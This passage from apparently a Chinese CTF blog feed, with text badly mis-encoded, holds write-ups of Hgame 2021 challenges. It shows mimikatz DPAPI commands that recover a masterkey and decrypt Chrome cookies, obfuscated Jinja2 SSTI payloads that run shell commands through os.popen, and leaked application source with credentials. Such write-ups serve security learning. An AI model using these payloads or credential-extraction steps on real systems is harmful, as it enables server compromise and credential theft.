æ–‡ä»¶å°±æ˜¯è¢«åŠ å¯†çš„é•œåƒäº†ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226034813077.png"></p><p>ç”¨ mimikatz å»è§£å¯† Cookiesï¼Œå‘ç°éœ€è¦ Masterkeyã€‚</p><blockquote><p>mimikatz</p><p><em>ï¼ˆåæ¸—é€å·¥å…·ï¼Œä»…åœ¨ Windows ä¸‹ä½¿ç”¨</em></p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p></blockquote><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226023542578.png" alt="Cookies"></p><pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># dpapi::chrome /in:secret\Cookies /unprotect</span>Host  <span class="token builtin class-name">:</span> localhost <span class="token punctuation">(</span> / <span class="token punctuation">)</span>Name  <span class="token builtin class-name">:</span> VeraCryptDates <span class="token builtin class-name">:</span> <span class="token number">2021</span>/2/19 <span class="token number">14</span>:08:59 -<span class="token operator">&gt;</span> <span class="token number">2022</span>/2/19 <span class="token number">14</span>:00:00 * using CryptUnprotectData APIERROR kuhl_m_dpapi_unprotect_raw_or_blob <span class="token punctuation">;</span> NTE_BAD_KEY_STATE, needed Masterkey is: <span class="token punctuation">{</span><span class="token number">57935170</span>-beab-4565-ba79-2b09570b95a6<span class="token punctuation">}</span></code></pre><p>è¿™ä¸ªéœ€è¦çš„ Masterkey æ­£å¥½å°±å’Œ <code>S-</code> å¼€å¤´çš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶ååŒåã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226030036640.png"></p><p>ç„¶åæŸ¥äº†ä¸€å †èµ„æ–™ï¼ˆ</p><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.anquanke.com/post/id/158667">Mimikatzä¹‹DPAPIå­¦ä¹ ä¸å®è·µ</a></p><p><a href="https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/">Operational Guidance for Offensive User DPAPI Abuse</a></p><p><a href="https://bbs.pediy.com/thread-247634.htm">[ç¿»è¯‘]æ»¥ç”¨User DPAPIè¿›è¡Œæ”»å‡»çš„æ“ä½œæŒ‡å—</a>ï¼ˆä¸Šé¢é‚£ç¯‡çš„ç¿»è¯‘ï¼‰</p><p><a href="https://www.lz1y.cn/2019/10/08/%E9%80%9A%E8%BF%87Dpapi%E8%8E%B7%E5%8F%96Windows%E8%BA%AB%E4%BB%BD%E5%87%AD%E8%AF%81/">é€šè¿‡Dpapiè·å–Windowsèº«ä»½å‡­è¯</a></p><p><a href="https://www.secpulse.com/archives/51527.html">åæ¸—é€æ”»é˜²çš„ä¿¡æ¯æ”¶é›†</a></p></blockquote><p>ç”¨ç³»ç»Ÿç™»å½•å¯†ç å»æ±‚è§£ Masterkeyã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># dpapi::masterkey /in:secret\S-1-5-21-262715442-3761430816-2198621988-1001\57935170-beab-4565-ba79-2b09570b95a6 /password:vIg*q3x6GFa5aFBA</span>**MASTERKEYS**  dwVersion          <span class="token builtin class-name">:</span> 00000002 - <span class="token number">2</span>  szGuid             <span class="token builtin class-name">:</span> <span class="token punctuation">{</span><span class="token number">57935170</span>-beab-4565-ba79-2b09570b95a6<span class="token punctuation">}</span>  dwFlags            <span class="token builtin class-name">:</span> 00000005 - <span class="token number">5</span>  dwMasterKeyLen     <span class="token builtin class-name">:</span> 000000b0 - <span class="token number">176</span>  dwBackupKeyLen     <span class="token builtin class-name">:</span> 00000090 - <span class="token number">144</span>  dwCredHistLen      <span class="token builtin class-name">:</span> 00000014 - <span class="token number">20</span>  dwDomainKeyLen     <span class="token builtin class-name">:</span> 00000000 - <span class="token number">0</span><span class="token punctuation">[</span>masterkey<span class="token punctuation">]</span>  **MASTERKEY**    dwVersion        <span class="token builtin class-name">:</span> 00000002 - <span class="token number">2</span>    salt             <span class="token builtin class-name">:</span> 0b6b5eb5eee1d3cc68d5e415cd3e4419    rounds           <span class="token builtin class-name">:</span> 000043f8 - <span class="token number">17400</span>    algHash          <span class="token builtin class-name">:</span> 0000800e - <span class="token number">32782</span> <span class="token punctuation">(</span>CALG_SHA_512<span class="token punctuation">)</span>    algCrypt         <span class="token builtin class-name">:</span> 00006610 - <span class="token number">26128</span> <span class="token punctuation">(</span>CALG_AES_256<span class="token punctuation">)</span>    pbKey            <span class="token builtin class-name">:</span> e3d3a53699471473f53c2316e39b0276941fb3599f5931ec3dd1ff5dfdd7c528b9c2b0a05e5eb7d070b9035eceb7788fb43994bc43ccd68d2a5b05708366de098e8b4e77780cc5296608e628173e826973f2124fe1f4dbf71a5485cc31e537056cae79ad95b461f1c881d268194731ccb14d33148885c7d9244c88ae1a8ee150adc74c6ab5a67ea87b6fe4bd8f6cd9ac<span class="token punctuation">[</span>backupkey<span class="token punctuation">]</span>  **MASTERKEY**    dwVersion        <span class="token builtin class-name">:</span> 00000002 - <span class="token number">2</span>    salt             <span class="token builtin class-name">:</span> 5e0428d80b0c876b249bbf53fe5d8ea8    rounds           <span class="token builtin class-name">:</span> 000043f8 - <span class="token number">17400</span>    algHash          <span class="token builtin class-name">:</span> 0000800e - <span class="token number">32782</span> <span class="token punctuation">(</span>CALG_SHA_512<span class="token punctuation">)</span>    algCrypt         <span class="token builtin class-name">:</span> 00006610 - <span class="token number">26128</span> <span class="token punctuation">(</span>CALG_AES_256<span class="token punctuation">)</span>    pbKey            <span class="token builtin class-name">:</span> 7f5d3f666c489f4be5bb1784bbe140cd0c764267b3ec33760522a97e6282f98f1192fee7030a70728bb0b96196557dca96fb89edad1bf13deb5d5cf9fc1946cdd71cefc7aa42468e9f4ce64e5f04f84ce98b729316f65bac9534e913178dc7b8e0d6b2900c39b0bb911eeff84622cd9c<span class="token punctuation">[</span>credhist<span class="token punctuation">]</span>  **CREDHIST INFO**    dwVersion        <span class="token builtin class-name">:</span> 00000003 - <span class="token number">3</span>    guid             <span class="token builtin class-name">:</span> <span class="token punctuation">{</span>24465cc4-8981-41cc-b3ae-ff825294bce1<span class="token punctuation">}</span>Auto SID from path seems to be: S-1-5-21-262715442-3761430816-2198621988-1001<span class="token punctuation">[</span>masterkey<span class="token punctuation">]</span> with password: vIg*q3x6GFa5aFBA <span class="token punctuation">(</span>normal user<span class="token punctuation">)</span>  key <span class="token builtin class-name">:</span> 3cafd3d8e6a67edf67e6fa0ca0464a031949182b3e68d72ce9c08e22d7a720b5d2a768417291a28fb79c6def7d068f84955e774e87e37c6b0b669e05fb7eb6f8  sha1: 8fc9b889a47a7216d5b39c87f8192d84a9eb8c57</code></pre><p>ç„¶åå†ç”¨è¿™ä¸ª Masterkey è§£å¼€ Cookieã€‚</p><p>key/sha1 éƒ½è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># dpapi::chrome /in:secret\Cookies /masterkey:8fc9b889a47a7216d5b39c87f8192d84a9eb8c57 /unprotect</span>Host  <span class="token builtin class-name">:</span> localhost <span class="token punctuation">(</span> / <span class="token punctuation">)</span>Name  <span class="token builtin class-name">:</span> VeraCryptDates <span class="token builtin class-name">:</span> <span class="token number">2021</span>/2/19 <span class="token number">14</span>:08:59 -<span class="token operator">&gt;</span> <span class="token number">2022</span>/2/19 <span class="token number">14</span>:00:00 * using CryptUnprotectData API * masterkey     <span class="token builtin class-name">:</span> 8fc9b889a47a7216d5b39c87f8192d84a9eb8c57Cookie: <span class="token operator">!</span>bWjAqM2z<span class="token operator">!</span>iSoJsV*<span class="token operator">&amp;</span>IRV@*AVI1VrtAb</code></pre><p>å¾—åˆ° VeraCrypt å¯†é’¥ <code>!bWjAqM2z!iSoJsV*&amp;IRV@*AVI1VrtAb</code>ã€‚</p><p><a href="https://www.veracrypt.fr/en/Downloads.html">https://www.veracrypt.fr/en/Downloads.html</a></p><p>æŒ‚è½½ container</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226032129235.png"></p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226032201470.png"></p><p><img src="/2021/03/04/CTF_2021HgameWeek4/ADS.jpg" alt="ADS"></p><p><strong>NTFS æ–‡ä»¶æµéšå†™</strong></p><p>å‚è€ƒä¹‹å‰å†™çš„ <a href="https://miaotony.xyz/2020/05/04/CTF_2020De1CTF/#%E5%85%B3%E4%BA%8E-NTFS-ADS-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93">å…³äº NTFS ADS çš„ä¸€äº›æ€»ç»“</a></p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226033026103.png"></p><pre class="language-none"><code class="language-none">hgame{Which_0nly_cryin9_3yes_c4n_de5cribe}And you may be intertested in this bonus: https://eyes.hgame2021.cf</code></pre><p><img src="/2021/03/04/CTF_2021HgameWeek4/download.png" alt="https://eyes.hgame2021.cf/"></p><p><strong>å¥½å¥—å¨ƒå•Šï¼</strong></p><p><strong>å“‡ï¼ï¼ï¼åŸæ¥ä½ ä»¬æ¸—é€éƒ½è¿™ä¹ˆä¼šç©çš„ä¹ˆï¼</strong></p><p>BTWï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œè¿™é¢˜æœ‰ç‚¹åƒ 2019 å›½é™…èµ› De1CTF DeepInRealï¼Œ<a href="https://www.anquanke.com/post/id/183507">å‚è€ƒé¢˜è§£</a>ã€‚</p><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><strong>å–µå‘œï¼</strong></p><p><strong>Hgame 2021 å®Œç»“æ’’èŠ±ï¼</strong></p><p>å¥½è€¶ï¼Œæ€»æ¦œç¬¬ 20ï¼Œæ²¡æ‰å‡ºç¬¬ä¸€é¡µï¼ˆçˆ¬èµ°</p><p>ä»Šå¹´å¥½éš¾å¾—åšæŒæ¯å‘¨éƒ½æ¥çœ‹é¢˜ç›®äº† 233. </p><p>ç©çš„è¿˜ç®—å¼€å¿ƒï¼Œå°±æ˜¯æœ‰ç‚¹å¤´ç§ƒã€‚</p><p>æ­ç”µçš„å‡ºé¢˜å¸¦å¸ˆå‚…ä»¬ä¹Ÿè¾›è‹¦äº†ã€‚<strong>ï¼ˆè¿™å°±å»æ‰“å‡ºé¢˜äºº</strong></p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 Hgame Week3 WriteUp</title>
      <link href="2021/02/23/CTF_2021HgameWeek3/"/>
      <url>2021/02/23/CTF_2021HgameWeek3/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>Hgame 2021 Week 3</p><p>å–µå‘œå‘œï¼Œç¬¬ä¸‰å‘¨å¥½éš¾å•Šï¼</p><p>è¿™å‘¨è¿‡å¹´æ¯”è¾ƒå¿™ï¼Œå°±éšæ„çœ‹äº†çœ‹å§ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><blockquote><p>Liki æ€»æ˜¯å¿˜è®°å¾ˆå¤šäº‹æƒ…ï¼Œäºæ˜¯å¥¹çµæœºä¸€åŠ¨ï¼Œç”¨æ–°å­¦ä¼šçš„ Python å†™äº†ä¸€ä¸ª TodoListï¼Œå¿«ç”¨èµ·æ¥å§ï¼</p><p><a href="https://todolist.liki.link/">https://todolist.liki.link/</a> </p></blockquote><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214220715777.png"></p><p>æŸ¥çœ‹ é¡µé¢å­˜åœ¨ SSTI.</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214220749054.png"></p><p><strong>Payload:</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fcla"</span><span class="token string">"ss\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fba"</span><span class="token string">"se\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fsubcla"</span><span class="token string">"sses\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">408</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fin"</span><span class="token string">"it\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fglo"</span><span class="token string">"bals\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fbuiltins\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fimport\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls -al /"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"> total <span class="token number">104</span>drwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:13 <span class="token builtin class-name">.</span>drwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:13 <span class="token punctuation">..</span>drwxr-xr-x   <span class="token number">5</span> root root <span class="token number">4096</span> Feb <span class="token number">13</span> <span class="token number">13</span>:59 appdrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Jun  <span class="token number">4</span>  <span class="token number">2020</span> bd_builddrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Jun  <span class="token number">4</span>  <span class="token number">2020</span> bindrwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Apr <span class="token number">24</span>  <span class="token number">2018</span> bootdrwxr-xr-x   <span class="token number">5</span> root root  <span class="token number">340</span> Feb <span class="token number">14</span> <span class="token number">14</span>:00 dev-rwxr-xr-x   <span class="token number">1</span> root root    <span class="token number">0</span> Feb <span class="token number">11</span> <span class="token number">16</span>:13 .dockerenvdrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">13</span> <span class="token number">14</span>:48 etc-rw-r--r--   <span class="token number">1</span> root root   <span class="token number">38</span> Feb <span class="token number">11</span> <span class="token number">16</span>:12 flagdrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:12 homedrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:12 libdrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:12 lib64drwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> mediadrwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> mntdrwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> optdr-xr-xr-x <span class="token number">217</span> root root    <span class="token number">0</span> Feb <span class="token number">14</span> <span class="token number">14</span>:00 proc-rw-r--r--   <span class="token number">1</span> root root  <span class="token number">122</span> Feb <span class="token number">11</span> <span class="token number">15</span>:10 requirements.txtdrwx------   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:12 rootdrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Jun  <span class="token number">4</span>  <span class="token number">2020</span> rundrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Jun  <span class="token number">4</span>  <span class="token number">2020</span> sbindrwxr-xr-x   <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> srvdr-xr-xr-x  <span class="token number">13</span> root root    <span class="token number">0</span> Feb <span class="token number">13</span> <span class="token number">12</span>:31 sysdrwxrwxrwt   <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">14</span> <span class="token number">11</span>:40 tmpdrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> usrdrwxr-xr-x   <span class="token number">1</span> root root <span class="token number">4096</span> Apr  <span class="token number">3</span>  <span class="token number">2020</span> var</code></pre><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214215906213.png"></p><p>ä½†æ˜¯å‘ç°è¯»ä¸äº†æ ¹ç›®å½•çš„ flagï¼Œå‘ç° <code>bash</code> æˆ–è€… <code>nc</code> ä¹Ÿåå¼¹ä¸äº† shellï¼Œemmm</p><p>ç„¶åè¯•äº† <code>wc -l /flag</code> å‘ç°å¹¶æ²¡æœ‰è¢«æ‹¦ï¼Œå…¶ä»–æ–‡ä»¶ä¹Ÿèƒ½è¯»ã€‚ï¼ˆæ²¡è¿‡æ»¤ <code>flag</code> <code>cat</code></p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214225949655.png"></p><p>æ‰€ä»¥æ¨æµ‹æ˜¯ <strong>è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸­å¦‚æœå‡ºç°å…³é”®å­—åˆ™æ‹¦æˆª</strong>ã€‚</p><p>è¯•è¯•å‘ç°ä»åå¾€å‰è¯»å¯ä»¥ï¼Œæœ€ç»ˆ payloadï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fcla"</span><span class="token string">"ss\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fba"</span><span class="token string">"se\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fsubcla"</span><span class="token string">"sses\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">408</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fin"</span><span class="token string">"it\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fglo"</span><span class="token string">"bals\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fbuiltins\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fimport\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"tail -c 35 /flag"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>æˆ–è€… <code>cat /flag|base64</code> ä¹Ÿè¡Œã€‚</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214230458663.png"></p><p><code>hgame{h0w_4bou7+L3arn!ng~PythOn^Now?}</code></p><p>æ°”æ­»æˆ‘äº†ï¼Œè¿™å°±å»è¯»æºç ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fcla"</span><span class="token string">"ss\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fba"</span><span class="token string">"se\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fsubcla"</span><span class="token string">"sses\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">408</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fin"</span><span class="token string">"it\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fglo"</span><span class="token string">"bals\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fbuiltins\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"\x5f\x5fimport\x5f\x5f"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls -al"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210214221640298.png"></p><pre class="language-bash" data-language="bash"><code class="language-bash">total <span class="token number">40</span>drwxr-xr-x <span class="token number">5</span> root root <span class="token number">4096</span> Feb <span class="token number">13</span> <span class="token number">13</span>:59 <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">16</span>:13 <span class="token punctuation">..</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">5255</span> Feb <span class="token number">13</span> <span class="token number">13</span>:59 app.py-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">168</span> Feb <span class="token number">11</span> <span class="token number">15</span>:10 ext.py-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">945</span> Feb <span class="token number">11</span> <span class="token number">15</span>:10 forms.py-rw-r--r-- <span class="token number">1</span> root root <span class="token number">1048</span> Feb <span class="token number">11</span> <span class="token number">15</span>:10 models.pydrwxr-xr-x <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">15</span>:10 __pycache__drwxr-xr-x <span class="token number">5</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">15</span>:10 staticdrwxr-xr-x <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">11</span> <span class="token number">15</span>:10 templates</code></pre><p><code>app.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">#-*- coding: UTF-8 -*-</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> unicode_literals<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">)</span><span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">from</span> flask_bootstrap <span class="token keyword">import</span> Bootstrap<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> login_required<span class="token punctuation">,</span> login_user<span class="token punctuation">,</span> logout_user<span class="token punctuation">,</span> current_user<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">from</span> forms <span class="token keyword">import</span> TodoListForm<span class="token punctuation">,</span> LoginForm<span class="token punctuation">,</span> RegisterForm<span class="token keyword">from</span> ext <span class="token keyword">import</span> db<span class="token punctuation">,</span> login_manager<span class="token keyword">from</span> models <span class="token keyword">import</span> TodoList<span class="token punctuation">,</span> User<span class="token keyword">import</span> pymysqlpymysql<span class="token punctuation">.</span>install_as_MySQLdb<span class="token punctuation">(</span><span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> <span class="token string">'ssssssTiLIKISAMA'</span>SALT <span class="token operator">=</span> <span class="token string">'SIKILIKISAMA'</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>bootstrap <span class="token operator">=</span> Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> SECRET_KEYapp<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_DATABASE_URI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"mysql://ctf:p45Sw0rdOfssti@ssti_database/todolist"</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>login_manager<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>login_manager<span class="token punctuation">.</span>login_view <span class="token operator">=</span> <span class="token string">"login"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">show_todo_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> TodoListForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        todolists <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>user_id<span class="token operator">=</span>current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> todolists<span class="token operator">=</span>todolists<span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            todolist <span class="token operator">=</span> TodoList<span class="token punctuation">(</span>current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">,</span> form<span class="token punctuation">.</span>title<span class="token punctuation">.</span>data<span class="token punctuation">,</span> form<span class="token punctuation">.</span>status<span class="token punctuation">.</span>data<span class="token punctuation">)</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>todolist<span class="token punctuation">)</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'You have ADD a new todo list'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'show_todo_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/delete/&lt;int:id&gt;'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">delete_todo_list</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_id <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first_or_404<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>user_id    <span class="token keyword">if</span> <span class="token punctuation">(</span>user_id <span class="token operator">==</span> current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        todolist <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first_or_404<span class="token punctuation">(</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>todolist<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token 